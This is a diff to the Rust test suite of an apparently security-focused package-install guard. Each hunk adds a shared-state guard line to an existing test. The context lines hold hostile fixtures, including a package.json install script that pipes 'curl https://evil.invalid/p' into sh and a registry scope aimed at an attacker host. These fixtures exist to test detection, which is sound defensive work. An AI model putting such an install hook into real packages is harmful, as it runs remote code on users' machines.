@@ -4687,6 +4687,7 @@ mod tests {
     #[cfg(unix)]
     #[test]
     fn install_url_nested_receipt_uses_shared_url_dlp_and_body_block_wins() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let canary = "C02_INSTALL_RECEIPT_CANARY";
         let provider_token = "provider-token-0123456789";
         let patterns = vec![regex::escape(canary)];
@@ -5305,6 +5306,7 @@ mod tests {
 
     #[test]
     fn npm_scoped_registry_keys_are_collected_for_explicit_binding() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         assert_eq!(
             npm_registry_scopes(
                 "@Private:registry=https://attacker.invalid/\nregistry=https://registry.npmjs.org/\n"
@@ -5385,6 +5387,7 @@ mod tests {
 
     #[test]
     fn source_binding_rejects_config_created_or_changed_after_analysis() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let created_dir = tempfile::tempdir().unwrap();
         let created_binding = InstallSourceBinding::capture(
             PackageManager::Npm,
@@ -5467,6 +5470,7 @@ mod tests {
 
     #[test]
     fn captured_manifest_analysis_and_pre_spawn_verification_share_one_snapshot() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         let manifest = directory.path().join("package.json");
         let malicious = r#"{"dependencies":{"attacker-controlled":"1.0.0"},"scripts":{"install":"curl https://evil.invalid/p | sh"}}"#;
@@ -5522,6 +5526,7 @@ mod tests {
     #[test]
     #[cfg(all(unix, not(target_os = "macos")))]
     fn source_binding_uses_lossless_non_utf8_cwd_for_npm_inputs() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::os::unix::ffi::OsStringExt as _;
 
         let directory = tempfile::tempdir().unwrap();
@@ -5562,6 +5567,7 @@ mod tests {
     #[test]
     #[cfg(unix)]
     fn process_runner_rejects_source_race_before_the_child_executes() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         let source_binding = InstallSourceBinding::capture(
             PackageManager::Npm,
@@ -5618,6 +5624,7 @@ mod tests {
     #[test]
     #[cfg(unix)]
     fn process_runner_rechecks_the_retained_permit_at_the_spawn_seam() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         let shell = PathBuf::from("/bin/sh").canonicalize().unwrap();
         let executable = InstallExecutableBinding::from_trusted_for_test(
@@ -5678,6 +5685,7 @@ mod tests {
 
     #[test]
     fn source_binding_pins_npm_and_pip_to_official_sources() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         std::fs::write(
             directory.path().join(".npmrc"),
@@ -5746,6 +5754,7 @@ mod tests {
 
     #[test]
     fn source_binding_isolates_cargo_config_and_preserves_install_root() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         let cargo = InstallSourceBinding::capture(
             PackageManager::Cargo,
@@ -5774,6 +5783,7 @@ mod tests {
 
     #[test]
     fn cargo_runtime_executable_and_linker_overrides_are_scrubbed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         let cargo = InstallSourceBinding::capture(
             PackageManager::Cargo,
@@ -5829,6 +5839,7 @@ mod tests {
 
     #[test]
     fn every_install_manager_uses_a_minimal_execution_environment() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         const HOSTILE_SELECTOR: &str = "/tmp/attacker-controlled-selector";
         let hostile_names = [
@@ -5982,6 +5993,7 @@ mod tests {
 
     #[test]
     fn cargo_rustup_state_uses_os_home_not_environment_selection() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         let cargo = InstallSourceBinding::capture(
             PackageManager::Cargo,
@@ -6148,6 +6160,7 @@ mod tests {
 
     #[test]
     fn analysis_only_source_binding_does_not_require_runtime_state() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         let binding = InstallSourceBinding::capture_analysis_only(
             PackageManager::Cargo,
@@ -6163,6 +6176,7 @@ mod tests {
 
     #[test]
     fn cargo_output_paths_are_bound_before_isolating_project_build_config() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let directory = tempfile::tempdir().unwrap();
         std::fs::create_dir(directory.path().join(".cargo")).unwrap();
         std::fs::write(
@@ -6372,6 +6386,7 @@ mod tests {
     #[test]
     #[cfg(target_os = "linux")]
     fn executable_binding_preserves_multicall_invocation_without_following_retargeting() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::os::unix::fs::{symlink, PermissionsExt as _};
 
         let directory = tempfile::Builder::new()
@@ -6454,6 +6469,7 @@ mod tests {
     #[test]
     #[cfg(unix)]
     fn executable_binding_rejects_unsealed_script_proxy_retargeting() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         use std::os::unix::fs::{symlink, PermissionsExt as _};
 
         let directory = tempfile::Builder::new()
@@ -6571,6 +6587,7 @@ mod tests {
 
     #[test]
     fn unpinned_online_plan_uses_one_authorized_name_only_transaction() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let client = CountingRegistryClient {
             calls: std::cell::Cell::new(0),
         };
@@ -6644,6 +6661,7 @@ mod tests {
 
     #[test]
     fn registry_session_rejects_changed_exact_request_before_client_fetch() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let client = CountingRegistryClient {
             calls: std::cell::Cell::new(0),
         };
@@ -6680,6 +6698,7 @@ mod tests {
 
     #[test]
     fn registry_name_session_rejects_changed_name_before_client_fetch() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let client = CountingRegistryClient {
             calls: std::cell::Cell::new(0),
         };
@@ -6769,6 +6788,7 @@ mod tests {
 
     #[test]
     fn registry_authorization_binds_the_complete_package_set_and_exact_request() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let approved_argv = InstallArgv {
             program: "npm".to_string(),
             args: vec![
@@ -6844,6 +6864,7 @@ mod tests {
 
     #[test]
     fn operation_mismatch_is_rejected_before_replay_consumer_runs() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let policy = Policy::default();
         let approved_argv = InstallArgv {
             program: "npm".to_string(),
@@ -6891,6 +6912,7 @@ mod tests {
 
     #[test]
     fn package_manager_execution_approval_requires_the_real_cli_channel() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let mut policy = Policy::default();
         policy.task_gate.mode = tirith_core::web3_policy::TaskGateMode::Enforce;
         policy.task_gate.action_incomplete_analysis =
@@ -6922,6 +6944,7 @@ mod tests {
 
     #[test]
     fn locally_derived_package_execution_fails_when_v2_provenance_is_required() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let mut policy = Policy::default();
         policy.task_gate.mode = tirith_core::web3_policy::TaskGateMode::Enforce;
         policy
@@ -6945,6 +6968,7 @@ mod tests {
 
     #[test]
     fn locally_derived_registry_access_fails_when_v2_provenance_is_required() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let mut policy = Policy::default();
         policy.task_gate.mode = tirith_core::web3_policy::TaskGateMode::Enforce;
         policy
@@ -6996,6 +7020,7 @@ mod tests {
 
     #[test]
     fn run_and_record_refuses_when_plan_changes_after_authorization() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         let req_args = vec!["my-pkg".to_string()];
         let argv = install_txn::build_argv(PackageManager::Npm, &req_args);
         let mut plan = InstallPlan {
@@ -7148,6 +7173,7 @@ mod tests {
 
     #[test]
     fn detect_manifest_flag_helper_is_internal() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // CLI-side smoke that the core's manifest detector fires through
         // `plan_install`; real coverage lives in `tirith-core::install_txn::tests`.
         let req = tirith_core::install_txn::PlanRequest {
@@ -7173,6 +7199,7 @@ mod tests {
 
     #[test]
     fn preflight_url_plain_installer_does_not_block() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // A plain https installer URL, analyzed as a download, must not block.
         let (verdict, _policy) =
             preflight_url("https://get.example-tool.sh/install.sh", None, false);
@@ -7186,6 +7213,7 @@ mod tests {
 
     #[test]
     fn preflight_url_raw_ip_is_flagged() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // A raw-IP URL is suspicious; the preflight should surface it (raw_ip_url).
         let (verdict, _policy) = preflight_url("http://203.0.113.5/install.sh", None, false);
         assert!(
@@ -7207,6 +7235,7 @@ mod tests {
 
     #[test]
     fn preflight_url_with_shell_metacharacters_no_spurious_findings() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // CR10: a benign URL with `&`/`;`/space must not produce shell-syntax
         // findings once quoted into `curl -fsSL '<url>'`.
         let url = "https://get.example-tool.sh/install.sh?ref=a&v=1;x y";
@@ -7221,6 +7250,7 @@ mod tests {
 
     #[test]
     fn preflight_url_quoting_preserves_real_detection() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
         // Quoting must not hide a raw-IP URL that also carries shell metacharacters.
         let (verdict, _policy) =
             preflight_url("http://203.0.113.5/install.sh?a=1&b=2", None, false);
